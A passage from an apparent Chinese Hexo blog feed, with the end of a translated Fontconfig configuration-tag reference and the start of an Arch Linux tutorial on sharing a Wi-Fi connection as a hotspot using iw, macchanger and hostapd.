class="line">monospace 则代表等宽字体（例如 DejaVu Sans Mono）</span><br><span class="line">然而，这些别名所代表的字体有可能会变化，而且通常 KDE 和其他桌面环境中的字体管理工具不会显示其内在联系</span><br></pre></td></tr></table></figure>
<h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>Fontconfig 是一个字体配置函数库，它既提供全局范围的配置，也允许每个用户进行个性化的配置，应用程序可以通过它访问字体。</p>
<h2 id="功能概览"><a href="#功能概览" class="headerlink" title="功能概览"></a>功能概览</h2><p>Fontconfig 由两个模块组成：<br>(1)配置模块，用于解析XML格式的配置文件；<br>(2)匹配模块，根据应用程序请求的字体模式(pattern)，返回最匹配的字体。</p>
<h2 id="配置文件标签"><a href="#配置文件标签" class="headerlink" title="配置文件标签"></a>配置文件标签</h2><h3 id="lt-fontconfig-gt"><a href="#lt-fontconfig-gt" class="headerlink" title="&lt;fontconfig&gt;"></a><code>&lt;fontconfig&gt;</code></h3><pre><code>这是字体配置的顶层单元，可以包含0或1个 &lt;config&gt;, &lt;selectfont&gt; 单元，
以及任意数的 &lt;dir&gt;, &lt;cachedir&gt;, &lt;include&gt;, &lt;match&gt;, &lt;alias&gt; 单元。
</code></pre><h3 id="lt-dir-prefix-quot-default-quot-gt"><a href="#lt-dir-prefix-quot-default-quot-gt" class="headerlink" title="&lt;dir prefix=&quot;default&quot;&gt;"></a><code>&lt;dir prefix=&quot;default&quot;&gt;</code></h3><pre><code>包含一个目录名，Fontconfig 将会扫描其中的字体文件，将找到的字体添加到系统的可用字体列表中。
</code></pre><p>如果将<code>prefix</code>设为<code>xdg</code>，那么环境变量 <code>XDG_DATA_HOME</code> 的值将会被作为前缀添加到路径的头部</p>
<p><code>$XDG_DATA_HOME</code> <a href="https://specifications.freedesktop.org/basedir-spec/basedir-spec-latest.html">参考</a></p>
<h3 id="lt-cachedir-prefix-quot-default-quot-gt"><a href="#lt-cachedir-prefix-quot-default-quot-gt" class="headerlink" title="&lt;cachedir prefix=&quot;default&quot;&gt;"></a><code>&lt;cachedir prefix=&quot;default&quot;&gt;</code></h3><pre><code>包含一个目录名称(&#39;~&#39;表示用户家目录)，用于保存字体属性的缓存(为了加速之后的读取)。
默认值是&quot;$XDG_CACHE_HOME/fontconfig&quot;。

配置文件含多个&lt;cachedir&gt;单元，读取缓存时会按顺序依次搜索，而在写入缓存时仅写入第一个有写入权限的目录。
缓存文件的名字遵循&quot;&lt;hash value&gt;-&lt;architecture&gt;.cache-&lt;version&gt;&quot;格式，其中的&lt;version&gt;是字体配置文件的版本号(目前是&quot;3&quot;)。
</code></pre><h3 id="lt-include-ignore-missing-quot-no-quot-prefix-quot-default-quot-gt"><a href="#lt-include-ignore-missing-quot-no-quot-prefix-quot-default-quot-gt" class="headerlink" title="&lt;include ignore_missing=&quot;no&quot; prefix=&quot;default&quot;&gt;"></a><code>&lt;include ignore_missing=&quot;no&quot; prefix=&quot;default&quot;&gt;</code></h3><pre><code>包含一个额外的配置文件或目录(&#39;~&#39;表用户家目录)。
如果是目录，那么该目录中所有文件名符合&quot;[0-9]*.conf&quot;格式的文件(以数字开头并以&#39;.conf&#39;结尾)，都将被按照文件名的ASCII顺序依次处理。
注意，这些文件本身必须是具有完整XML结构的字体配置文件(包含完整的DOCTYPE声明)，而不是用于插入此处的配置片段。
当配置文件的XML数据被 FcConfigParse 函数解析之后，包含的文件(或目录中文件名符合&quot;[0-9]*.conf&quot;格式的文件)也会被传递给 FcConfigLoadAndParse 函数进行处理，从而将这些文件的内容也整合到配置中。
如果将&#39;ignore_missing&#39;设为&quot;yes&quot;(默认的&quot;no&quot;)，那么将不会对丢失的文件或目录发出警告。
</code></pre><h3 id="lt-config-gt"><a href="#lt-config-gt" class="headerlink" title="&lt;config&gt;"></a><code>&lt;config&gt;</code></h3><pre><code>提供了一个整合附加配置信息的地方。&lt;config&gt;可以包含0或1个 &lt;blank&gt;, &lt;rescan&gt; 单元。
</code></pre><h3 id="lt-blank-gt"><a href="#lt-blank-gt" class="headerlink" title="&lt;blank&gt;"></a><code>&lt;blank&gt;</code></h3><pre><code>在编码中存在但字体中缺少的字形(glyph)，只能在屏幕上绘制成空白。通过&lt;blank&gt;单元中放置原本就应该绘制成空白的 Unicode 字符(例如空格)，就可以推断出：
没在&lt;blank&gt;中但被绘制为空白的字符是该字体所不支持的字符。不被支持的字符将会从该字体支持的字符集中剔除。
&lt;blank&gt;可以包含任意数量的&lt;int&gt;和&lt;range&gt;单元，用于指定这些空白字符的Unicode码位(code point)。
</code></pre><h3 id="lt-rescan-gt"><a href="#lt-rescan-gt" class="headerlink" title="&lt;rescan&gt;"></a><code>&lt;rescan&gt;</code></h3><pre><code>&lt;rescan&gt;仅容纳一个&lt;int&gt;单元，表示每隔多少秒自动扫描一次字体配置文件。
每次扫描，Fontconfig 都会验证所有的配置文件和目录，并自动重建内部的数据结构。
</code></pre><h3 id="lt-selectfont-gt"><a href="#lt-selectfont-gt" class="headerlink" title="&lt;selectfont&gt;"></a><code>&lt;selectfont&gt;</code></h3><pre><code>&lt;selectfont&gt;通过包含0或1个 &lt;rejectfont&gt;, &lt;acceptfont&gt; 单元来设置字体黑名单与白名单。
通过包含一个&lt;rejectfont&gt;单元，将某些字体排除在可用字体列表之外；
同样，通过包含一个&lt;acceptfont&gt;单元，将某些字体包含在可用字体列表之内。
</code></pre><h3 id="lt-acceptfont-gt"><a href="#lt-acceptfont-gt" class="headerlink" title="&lt;acceptfont&gt;"></a><code>&lt;acceptfont&gt;</code></h3><pre><code>&lt;acceptfont&gt;通过包含任意数量的&lt;glob&gt;和&lt;pattern&gt;单元来匹配&quot;白名单&quot;字体。
匹配字体列入&quot;白名单&quot;，被明确包含在可用字体列表之内，它们可以用于字体匹配和被列出给应用程序。
注意，&quot;白名单&quot;中的字体永远不会被&lt;rejectfont&gt;列入&quot;黑名单&quot;。
</code></pre><h3 id="lt-rejectfont-gt"><a href="#lt-rejectfont-gt" class="headerlink" title="&lt;rejectfont&gt;"></a><code>&lt;rejectfont&gt;</code></h3><pre><code>&lt;rejectfont&gt;通过包含任意数量的&lt;glob&gt;和&lt;pattern&gt;单元来匹配&quot;黑名单&quot;字体。
匹配字体列入&quot;黑名单&quot;(注：&quot;白名单&quot;字体永不被列入&quot;黑名单&quot;)，被明确排除在可用字体列表之外：
不会被用于字体匹配，也不会被列出给应用程序，就好象系统中更本不存在这些字体一样。
</code></pre><h3 id="lt-glob-gt"><a href="#lt-glob-gt" class="headerlink" title="&lt;glob&gt;"></a><code>&lt;glob&gt;</code></h3><pre><code>容纳一个含通配符(&quot;?&quot;和&quot;*&quot;)的文件名进行匹配。
不过，基于后缀名的匹配并不总是那么可靠，因为并非所有字体文件的命名都十分规范。
注意，&lt;glob&gt;单元仅用于目录，不作用于单个字体。
</code></pre><h3 id="lt-pattern-gt"><a href="#lt-pattern-gt" class="headerlink" title="&lt;pattern&gt;"></a><code>&lt;pattern&gt;</code></h3><pre><code>&lt;pattern&gt;通过包含任意数量的&lt;patelt&gt;单元，将字体的属性值与&lt;patelt&gt;单元列出的属性值列表进行比较，如果&lt;patelt&gt;单元列出的属性值列表中至少有一项与输入字体对应的属性值相符，就表示该字体与整个&lt;pattern&gt;单元的要求相符合。这样就可以基于字体的属性(缩放,粗细等)来匹配字体，比根据字体文件的后缀名匹配要可靠。
</code></pre><h3 id="lt-patelt-name-quot-属性-quot-gt"><a href="#lt-patelt-name-quot-属性-quot-gt" class="headerlink" title="&lt;patelt name=&quot;属性&quot;&gt;"></a><code>&lt;patelt name=&quot;属性&quot;&gt;</code></h3><pre><code>必须指定&quot;property&quot;，表明该&lt;patelt&gt;单元要比较字体的哪个属性。&lt;patelt&gt;又通过包含一系列常量单元，来指定可与该属性匹配的值列表。&quot;常量单元&quot;指：&lt;int&gt;, &lt;double&gt;, &lt;string&gt;, &lt;matrix&gt;, &lt;bool&gt;, &lt;charset&gt;, &lt;langset&gt;, &lt;const&gt;
</code></pre><h3 id="lt-match-target-quot-目标-quot-gt"><a href="#lt-match-target-quot-目标-quot-gt" class="headerlink" title="&lt;match target=&quot;目标&quot;&gt;"></a><code>&lt;match target=&quot;目标&quot;&gt;</code></h3><pre><code>&lt;match&gt;必须首先包含一系列&lt;test&gt;组成的列表(可以为空)，然后再包含一系列&lt;edit&gt;组成的列表(可以为空)，也就是&lt;test&gt;列表必须位于&lt;edit&gt;列表之前。注意：虽然两个列表都可以为空，但是不可以同时为空。
如果&quot;目标&quot;满足&lt;test&gt;列表的所有测试条件，那么将被按照&lt;edit&gt;列表中的指令序列进行修改。
target 的默认值是&quot;pattern&quot;，表示此&lt;match&gt;单元针对的是用于匹配的字体模板(第一次修改)。
如果&quot;目标&quot;是&quot;font&quot;，那么就表示此&lt;match&gt;单元针对的是已被选定的字体(第二次修改)。
如果&quot;目标&quot;是&quot;scan&quot;，那么就表示此&lt;match&gt;单元针对的是扫描字体以创建内部配置数据的初始化阶段(FcConfigParse)。
</code></pre><h3 id="lt-test-qual-quot-品质-quot-name-quot-属性-quot-target-quot-目标-quot-compare-quot-比较-quot-ignore-blanks-quot-false-quot-gt"><a href="#lt-test-qual-quot-品质-quot-name-quot-属性-quot-target-quot-目标-quot-compare-quot-比较-quot-ignore-blanks-quot-false-quot-gt" class="headerlink" title="&lt;test qual=&quot;品质&quot; name=&quot;属性&quot; target=&quot;目标&quot; compare=&quot;比较&quot; ignore-blanks=&quot;false&quot;&gt;"></a><code>&lt;test qual=&quot;品质&quot; name=&quot;属性&quot; target=&quot;目标&quot; compare=&quot;比较&quot; ignore-blanks=&quot;false&quot;&gt;</code></h3><pre><code>&lt;test&gt;必须包含一个单独的表达式单元(其值将在运行时实时计算)，用于和&quot;目标&quot;的&quot;属性&quot;(参见前面&quot;字体属性&quot;小节)值列表进行&quot;比较&quot;。
&quot;compare&quot;的默认值是&quot;eq&quot;[等于]，&quot;比较&quot;有：&quot;not_eq&quot;[不等于], &quot;less&quot;[小于], &quot;less_eq&quot;[小于等于],&quot;more&quot;[大于], &quot;more_eq&quot;[大于等于], &quot;contains&quot;[包含(字符串)], &quot;not_contains&quot;[不包含(字符串)]。
&quot;qual&quot;的默认值是&quot;any&quot;，表示只要&quot;属性&quot;值列表中有任意一项&quot;比较&quot;成功，就算测试成功。
如果&quot;品质&quot;是&quot;all&quot;，那么只有&quot;属性&quot;值列表中的所有项全都&quot;比较&quot;成功，才能算测试成功。
如果&quot;品质&quot;是&quot;first&quot;，那么&quot;属性&quot;值列表中的第一项必须&quot;比较&quot;成功，才能算测试成功。
如果&quot;品质&quot;是&quot;not_first&quot;，那么&quot;属性&quot;值列表中的第一项必须&quot;比较&quot;失败，同时后继项中又有至少一项&quot;比较&quot;成功，才能算测试成功。
&quot;目标&quot;的默认值是&quot;default&quot;，表示继承外层&lt;match&gt;单元的值。当外层是&lt;match target=&quot;font&quot;&gt;时，可将&quot;目标&quot;设为&quot;pattern&quot;，以强迫此&lt;test&gt;作用于原始的字体模板，而不是选中的字体。
&#39;ignore-blanks&#39;仅在 compare=&quot;eq&quot; 或 compare=&quot;not_eq&quot; 的情况下才有意义，默认是&quot;false&quot;，表示任何字符串中的空白在&quot;比较&quot;时都会被保留，如果设为&quot;true&quot;，则表示在&quot;比较&quot;时忽略字符串中的空白。
</code></pre><h3 id="lt-edit-name-quot-属性-quot-mode-quot-修改方式-quot-binding-quot-绑定-quot-gt"><a href="#lt-edit-name-quot-属性-quot-mode-quot-修改方式-quot-binding-quot-绑定-quot-gt" class="headerlink" title="&lt;edit name=&quot;属性&quot; mode=&quot;修改方式&quot; binding=&quot;绑定&quot;&gt;"></a><code>&lt;edit name=&quot;属性&quot; mode=&quot;修改方式&quot; binding=&quot;绑定&quot;&gt;</code></h3><pre><code>&lt;edit&gt;包含一系列特定顺序的表达式单元(其值将在运行时实时计算)，用于修改&quot;目标&quot;(来自外层&lt;match&gt;单元)的&quot;属性&quot;值列表。
&quot;表达式单元&quot;是指：&lt;int&gt;, &lt;double&gt;, &lt;string&gt;, &lt;matrix&gt;, &lt;bool&gt;, &lt;charset&gt;, &lt;langset&gt;, &lt;name&gt;, &lt;const&gt;,&lt;or&gt;, &lt;and&gt;, &lt;eq&gt;, &lt;not_eq&gt;, &lt;less&gt;, &lt;less_eq&gt;, &lt;more&gt;, &lt;more_eq&gt;, &lt;contains&gt;, &lt;not_contains&gt;,&lt;plus&gt;, &lt;minus&gt;, &lt;times&gt;, &lt;divide&gt;, &lt;not&gt;, &lt;if&gt;,&lt;floor&gt;, &lt;ceil&gt;, &lt;round&gt;, &lt;trunc&gt;
&quot;绑定&quot;仅在 name=&quot;family&quot; 的情况下才有意义(参见前面的字体匹配规则特例)。
其默认值是&quot;weak&quot;，表示弱绑定；若设为&quot;strong&quot;，则表示强绑定；而设为&quot;same&quot;，则表示不改变当前的绑定。
至于如何修改，则与两个因素有关：(1)&quot;修改方式&quot;，(2)此&lt;edit&gt;的&quot;属性&quot;是否与同&lt;match&gt;内某个&lt;test&gt;的&quot;属性&quot;相同。
具体如下表所示：

      &quot;修改方式&quot;              有相同&quot;属性&quot;              无相同&quot;属性&quot;
      ---------------------------------------------------------------------
      &quot;assign&quot;(默认值)        替换第一个匹配的值        替换全部值
      &quot;assign_replace&quot;        替换全部值                替换全部值
      &quot;prepend&quot;               在第一个匹配的值之前插入  在值列表的首部插入
      &quot;prepend_first&quot;         在值列表的首部插入        在值列表的首部插入
      &quot;append&quot;                在第一个匹配的值之后添加  在值列表的尾部添加
      &quot;append_last&quot;           在值列表的尾部添加        在值列表的尾部添加
      &quot;delete&quot;                删除第一个匹配的值        删除全部值
      &quot;delete_all&quot;            删除全部值                删除全部值
</code></pre><h3 id="lt-alias-binding-quot-绑定-quot-gt"><a href="#lt-alias-binding-quot-绑定-quot-gt" class="headerlink" title="&lt;alias binding=&quot;绑定&quot;&gt;"></a><code>&lt;alias binding=&quot;绑定&quot;&gt;</code></h3><pre><code>&lt;alias&gt;单元为修改字族名称提供了一种专门的速记法(有画蛇添足之嫌)。
&quot;绑定&quot;的默认值是&quot;weak&quot;，表示弱绑定；若设为&quot;strong&quot;，则表示强绑定；而设为&quot;same&quot;，则表示不改变当前的绑定。
&lt;alias&gt;必须首先包含一个单独的&lt;family&gt;单元，然后再依次包含：0或1个&lt;prefer&gt;单元、0或1个&lt;accept&gt;单元、0或1个&lt;default&gt;单元。
这种标记法等价于如下结构：
      &lt;match&gt;
        &lt;test name=&quot;family&quot; ignore-blanks=&quot;true&quot;&gt;&lt;string value=[family]/&gt;&lt;/test&gt;
        &lt;edit name=&quot;family&quot; binding=&quot;绑定&quot; mode=&quot;prepend&quot;&gt; &lt;string value=[prefer]/&gt; ... &lt;/edit&gt;
        &lt;edit name=&quot;family&quot; binding=&quot;绑定&quot; mode=&quot;append&quot;&gt; &lt;string value=[accept]/&gt; ... &lt;/edit&gt;
        &lt;edit name=&quot;family&quot; binding=&quot;绑定&quot; mode=&quot;append_last&quot;&gt; &lt;string value=[default]/&gt; ... &lt;/edit&gt;
      &lt;/match&gt;
</code></pre><h3 id="lt-family-gt"><a href="#lt-family-gt" class="headerlink" title="&lt;family&gt;"></a><code>&lt;family&gt;</code></h3><pre><code>用于容纳一个单独的字族名称。
</code></pre><h3 id="lt-prefer-gt-lt-accept-gt-lt-default-gt"><a href="#lt-prefer-gt-lt-accept-gt-lt-default-gt" class="headerlink" title="&lt;prefer&gt;, &lt;accept&gt;, &lt;default&gt;"></a><code>&lt;prefer&gt;, &lt;accept&gt;, &lt;default&gt;</code></h3><pre><code>这些单元可以容纳一系列特定顺序的&lt;family&gt;单元。
</code></pre><h3 id="lt-int-gt-lt-double-gt-lt-string-gt-lt-bool-gt"><a href="#lt-int-gt-lt-double-gt-lt-string-gt-lt-bool-gt" class="headerlink" title="&lt;int&gt;, &lt;double&gt;, &lt;string&gt;, &lt;bool&gt;"></a><code>&lt;int&gt;, &lt;double&gt;, &lt;string&gt;, &lt;bool&gt;</code></h3><pre><code>这些单元必须按照其声明的类型容纳一个单独的常量值。&lt;bool&gt;只能容纳 true 或者 false 。
此外，浮点数必须以数字开头，而不能以小数点开头(例如：必须使用 0.5 而不是 .5 ，而对于负数，则必须使用 -0.5 而不是 -.5 )。
</code></pre><h3 id="lt-matrix-gt"><a href="#lt-matrix-gt" class="headerlink" title="&lt;matrix&gt;"></a><code>&lt;matrix&gt;</code></h3><pre><code>&lt;matrix&gt;必须包含4个&lt;double&gt;单元，以指定仿射变换的四个系数(用于合成斜体)。
此外，也可以用表达式单元(参见前面的解释)来替换&lt;double&gt;单元，但是每个表达式单元的计算结果都必须是数值。
</code></pre><h3 id="lt-range-gt"><a href="#lt-range-gt" class="headerlink" title="&lt;range&gt;"></a><code>&lt;range&gt;</code></h3><pre><code>&lt;range&gt;通过包含两个&lt;int&gt;单元界定一个整数范围(包括两端的整数)。
</code></pre><h3 id="lt-charset-gt"><a href="#lt-charset-gt" class="headerlink" title="&lt;charset&gt;"></a><code>&lt;charset&gt;</code></h3><pre><code>&lt;charset&gt;可以包含任意数量的 &lt;int&gt;, &lt;range&gt; 单元，用于表示一组Unicode码位(code point)。
由于每个码位都是一个正整数，都对应着一个Unicode字符，所以&lt;charset&gt;单元相当于定于了一个字符集。
</code></pre><h3 id="lt-langset-gt"><a href="#lt-langset-gt" class="headerlink" title="&lt;langset&gt;"></a><code>&lt;langset&gt;</code></h3><pre><code>&lt;langset&gt;必须包含至少一个&lt;string&gt;单元，而每个&lt;string&gt;单元必须包含一个符合RFC-3066规范的语言标记(语言[-国家])。
</code></pre><h3 id="lt-name-target-quot-目标-quot-gt"><a href="#lt-name-target-quot-目标-quot-gt" class="headerlink" title="&lt;name target=&quot;目标&quot;&gt;"></a><code>&lt;name target=&quot;目标&quot;&gt;</code></h3><pre><code>&lt;name&gt;必须包含一个字体属性的名称，而单元的值则等于&quot;目标&quot;的该属性值列表中的第一个值。
&quot;目标&quot;的默认值是&quot;default&quot;，表示继承外层&lt;match&gt;单元的值。唯一的例外是：
当外层是&lt;match target=&quot;font&quot;&gt;时，可将&quot;目标&quot;设为&quot;pattern&quot;，以强迫此&lt;name&gt;作用于原始的字体模板，而不是选中的字体。
</code></pre><h3 id="lt-const-gt"><a href="#lt-const-gt" class="headerlink" title="&lt;const&gt;"></a><code>&lt;const&gt;</code></h3><pre><code>&lt;const&gt;必须包含一个下表中的常量名称。表中的数值总是整数，并且这些常量只能作为对应属性值的字符记号使用。

      常量            属性            数值  [译者注]
      ----------------------------------------------------
      thin            weight          0
      extralight      weight          40
      ultralight      weight          40
      light           weight          50
      book            weight          75
      regular         weight          80
      normal          weight          80
      medium          weight          100
      demibold        weight          180
      semibold        weight          180
      bold            weight          200
      extrabold       weight          205
      black           weight          210
      heavy           weight          210
      roman           slant           0     [正体]
      italic          slant           100   [斜体]
      oblique         slant           110   [合成斜体]
      ultracondensed  width           50
      extracondensed  width           63
      condensed       width           75
      semicondensed   width           87
      normal          width           100
      semiexpanded    width           113
      expanded        width           125
      extraexpanded   width           150
      ultraexpanded   width           200
      proportional    spacing         0    [比例，也就是非等宽，也就是没有统一的宽度，每个字符的宽度都不同]
      dual            spacing         90   [双宽，只有两个固定的宽度，通常是一个全角=两个半角，例如&quot;SimHei&quot;与&quot;幼圆&quot;]
      mono            spacing         100  [等宽，只有一个固定的宽度，也就是每个字符的宽度都完全相同，例如&quot;Courier&quot;]
      charcell        spacing         110  [字符单元，仅用于纯点阵字体，例如&quot;Unifont&quot;]
      unknown         rgba            0    [未知]
      rgb             rgba            1    [横向(水平)&quot;Red Green Blue&quot;，这是最常见的LCD]
      bgr             rgba            2    [横向(水平)&quot;Blue Green Red&quot;]
      vrgb            rgba            3    [纵向(垂直)&quot;Red Green Blue&quot;]
      vbgr            rgba            4    [纵向(垂直)&quot;Blue Green Red&quot;]
      none            rgba            5    [无子像素，也就是非LCD屏，例如传统的CRT显示器]
      lcdnone         lcdfilter       0    [彻底关闭 LCD filter，不推荐，它会导致笔画边缘出现彩色边纹]
      lcddefault      lcdfilter       1    [最大限度的消除彩色边纹，但是可能会增加笔画的模糊程度。多数场合这是最佳选择]
      lcdlight        lcdfilter       2    [减轻笔画的模糊程度，但不能最大限度的消除彩色边纹。少数场合也许效果更好]
      lcdlegacy       lcdfilter       3    [为了与传统的&quot;libXft color filter&quot;兼容而设置，未来会被删除]
      hintnone        hintstyle       0    [禁用微调(包括自动微调与内嵌微调)]
      hintslight      hintstyle       1    [优先保持字符的形态，但是可能会降低笔画的锐利度]
      hintmedium      hintstyle       2    [在字符形态与笔画锐利度之间进行折中，实际效果通常相当于&quot;hintfull&quot;]
      hintfull        hintstyle       3    [优先提高笔画的锐利度，但是可能破坏字符的形态]
</code></pre><h3 id="lt-or-gt-lt-and-gt-lt-plus-gt-lt-minus-gt-lt-times-gt-lt-divide-gt"><a href="#lt-or-gt-lt-and-gt-lt-plus-gt-lt-minus-gt-lt-times-gt-lt-divide-gt" class="headerlink" title="&lt;or&gt;, &lt;and&gt;, &lt;plus&gt;, &lt;minus&gt;, &lt;times&gt;, &lt;divide&gt;"></a><code>&lt;or&gt;, &lt;and&gt;, &lt;plus&gt;, &lt;minus&gt;, &lt;times&gt;, &lt;divide&gt;</code></h3><pre><code>这些单元都必须包含至少两个表达式单元(参见前面的解释)，然后对它们进行相应的运算：
&lt;or&gt;(或)；&lt;and&gt;(与)；&lt;plus&gt;(加)；&lt;minus&gt;(减)；&lt;times&gt;(乘)；&lt;divide&gt;(除)。
注意，&lt;or&gt;与&lt;and&gt;执行的是逻辑运算(而不是位运算)。
</code></pre><h3 id="lt-eq-gt-lt-not-eq-gt-lt-less-gt-lt-less-eq-gt-lt-more-gt-lt-more-eq-gt-lt-contains-gt-lt-not-contains-gt"><a href="#lt-eq-gt-lt-not-eq-gt-lt-less-gt-lt-less-eq-gt-lt-more-gt-lt-more-eq-gt-lt-contains-gt-lt-not-contains-gt" class="headerlink" title="&lt;eq&gt;, &lt;not_eq&gt;, &lt;less&gt;, &lt;less_eq&gt;, &lt;more&gt;, &lt;more_eq&gt;, &lt;contains&gt;, &lt;not_contains&gt;"></a><code>&lt;eq&gt;, &lt;not_eq&gt;, &lt;less&gt;, &lt;less_eq&gt;, &lt;more&gt;, &lt;more_eq&gt;, &lt;contains&gt;, &lt;not_contains&gt;</code></h3><pre><code>这些单元都必须包含恰好两个表达式单元(参见前面的解释)，然后对它们进行相应的运算：
&lt;eq&gt;(等于)；&lt;not_eq&gt;(不等于)；&lt;less&gt;(小于)；&lt;less_eq&gt;(小于等于)；&lt;more&gt;(大于)；
&lt;more_eq&gt;(大于等于)；&lt;contains&gt;(包含)；&lt;not_contains&gt;(不包含)。
他们都会得到一个逻辑结果(true 或 false)。
</code></pre><h3 id="lt-not-gt-lt-floor-gt-lt-ceil-gt-lt-round-gt-lt-trunc-gt"><a href="#lt-not-gt-lt-floor-gt-lt-ceil-gt-lt-round-gt-lt-trunc-gt" class="headerlink" title="&lt;not&gt;, &lt;floor&gt;, &lt;ceil&gt;, &lt;round&gt;, &lt;trunc&gt;"></a><code>&lt;not&gt;, &lt;floor&gt;, &lt;ceil&gt;, &lt;round&gt;, &lt;trunc&gt;</code></h3><pre><code>这些单元都必须包含恰好一个表达式单元(参见前面的解释)，然后对它们进行相应的运算。
&lt;not&gt;执行的是逻辑运算(而不是位运算)，会得到一个逻辑结果(true 或 false)。
其他都是算术运算，都会得到一个整数：
&lt;floor&gt;表示向下取整；&lt;ceil&gt;表示向上取整；&lt;round&gt;表示四舍五入；&lt;trunc&gt;表示去掉小数部分。
</code></pre><h3 id="lt-if-gt"><a href="#lt-if-gt" class="headerlink" title="&lt;if&gt;"></a><code>&lt;if&gt;</code></h3><pre><code>&lt;if&gt;必须包含恰好三个表达式单元(参见前面的解释)。
如果第一个表达式的值是真，那么整个单元的值就取第二个表达式的值，否则就取第三个表达式的值。
</code></pre><h1 id="参考"><a href="#参考" class="headerlink" title="参考:"></a>参考:</h1><p><a href="https://wiki.archlinux.org/index.php/Fonts">https://wiki.archlinux.org/index.php/Fonts</a><br><a href="https://wiki.archlinux.org/index.php/Font_configuration">https://wiki.archlinux.org/index.php/Font_configuration</a><br><a href="http://www.jinbuguo.com/gui/linux_fontconfig.html">http://www.jinbuguo.com/gui/linux_fontconfig.html</a><br><a href="http://www.jinbuguo.com/gui/fonts.conf.html">http://www.jinbuguo.com/gui/fonts.conf.html</a></p>
]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux开启wifi和热点双用</title>
    <url>/posts/79b99049/</url>
    <content><![CDATA[<p>  有些情况下我们需要将连接并认证过的wifi共享出来，这样就无需多个认证达到多人使用了</p>
<h1 id="手动配置"><a href="#手动配置" class="headerlink" title="手动配置"></a>手动配置</h1><h2 id="无线网卡是否支持AP模式"><a href="#无线网卡是否支持AP模式" class="headerlink" title="无线网卡是否支持AP模式"></a>无线网卡是否支持AP模式</h2><p>  无线设备必须兼容 <code>nl80211</code>标准 ,并且支持 <code>AP (Access Point)</code>工作模式。可通过 <code>iw list</code> 命令查看无线网卡设备信息, 输出信息到<code>Supported interface modes</code> 段落中要有 <code>AP</code> 模式:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iw list</span><br></pre></td></tr></table></figure>
<p>输出中包含<code>* AP</code>代表支持AP模式，可开启热点<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!--more--&gt;</span><br><span class="line">Wiphy phy1</span><br><span class="line">...</span><br><span class="line">	Supported interface modes:</span><br><span class="line">...</span><br><span class="line">	 * AP</span><br><span class="line">...</span><br><span class="line">valid interface combinations:</span><br><span class="line">     * #&#123; managed &#125; &lt;&#x3D; 2048, #&#123; AP, mesh point &#125; &lt;&#x3D; 8, #&#123; P2P-client, P2P-GO &#125; &lt;&#x3D; 1,</span><br><span class="line">     total &lt;&#x3D; 2048, #channels &lt;&#x3D; 1, STA&#x2F;AP BI must match</span><br><span class="line">...</span><br></pre></td></tr></table></figure><br>  注意：<code>#channels &lt;=1</code> 代表开启的热点<strong>必须</strong>所连wifi用<strong>同一信道</strong></p>
<h2 id="创建热点接口"><a href="#创建热点接口" class="headerlink" title="创建热点接口"></a>创建热点接口</h2><p>  查看无线网卡设备接口</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ip a</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wlan0: ...</span><br><span class="line">    link&#x2F;ether ...</span><br><span class="line">    inet ...</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
<p>  创建虚拟接口<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo iw dev wlan0 interface add wifi_ap type managed addr 12:34:56:78:ab:cd</span><br><span class="line"># 或</span><br><span class="line">sudo iw phy phy0 interface add wifi_ap type managed addr 12:34:56:78:ab:cd</span><br></pre></td></tr></table></figure><br>  如需删除接口使用命令<code>sudo iw dev wifi_ap del</code>即可删除</p>
<p>  可使用<a href="https://wiki.archlinux.org/index.php/MAC_address_spofing"><code>macchanger</code></a>给虚拟接口生成一个随机Mac地址<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo macchanger -r wifi_ap</span><br></pre></td></tr></table></figure></p>
<p>  如需恢复Mac地址使用命令<code>macchanger -p wifi_ap</code></p>
<h2 id="配置热点"><a href="#配置热点" class="headerlink" title="配置热点"></a>配置热点</h2><p>  安装<code>hostapd</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S hostapd</span><br></pre></td></tr></table></figure>
<p>  配置<code>hostapd</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/hostapd/hostapd.conf</span><br><span class="line"><span class="comment"># 添加</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 热点名</span></span><br><span class="line">ssid=test_wifi_ap</span><br><span class="line"><span class="comment"># 配置密码</span></span><br><span class="line">wpa_passphrase=password</span><br><span class="line">wpa=2</span><br><span class="line">wpa_key_mgmt=WPA-PSK</span><br><span class="line">wpa_pairwise=TKIP CCMP</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 接口</span></span><br><span class="line">interface=wifi_ap</span><br><span class="line"><span class="comment"># 信道(保持与wifi一样)</span></span><br><span class="line">channel=1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 其它使用默认，也可自行根据注释说明修改</span></span><br><span class="line"></span><br><span class="line">logger_syslog=-1</span><br><span class="line">logger_syslog_level=2</span><br><span class="line">logger_stdout=-1</span><br><span class="line">logger_stdout_level=2</span><br><span class="line">ctrl_interface=/run/hostapd</span><br><span class="line">ctrl_interface_group=0</span><br><span class="line">hw_mode=g</span><br><span class="line">beacon_int=100</span><br><span class="line">dtim_period=2</span><br><span class="line">max_num_sta=255</span><br><span class="line">rts_threshold=-1</span><br><span class="line">fragm_threshold=-1</span><br><span class="line">macaddr_acl=0</span><br><span class="line">auth_algs=3</span><br><span class="line">ignore_broadcast_ssid=0</span><br><span class="line">wmm_enabled=1</span><br><span class="line">wmm_ac_bk_cwmin=4</span><br><span class="line">wmm_ac_bk_cwmax=10</span><br><span class="line">wmm_ac_bk_aifs=7</span><br><span class="line">wmm_ac_bk_txop_limit=0</span><br><span class="line">wmm_ac_bk_acm=0</span><br><span class="line">wmm_ac_be_aifs=3</span><br><span class="line">wmm_ac_be_cwmin=4</span><br><span class="line">wmm_ac_be_cwmax=10</span><br><span class="line">wmm_ac_be_txop_limit=0</span><br><span class="line">wmm_ac_be_acm=0</span><br><span class="line">wmm_ac_vi_aifs=2</span><br><span 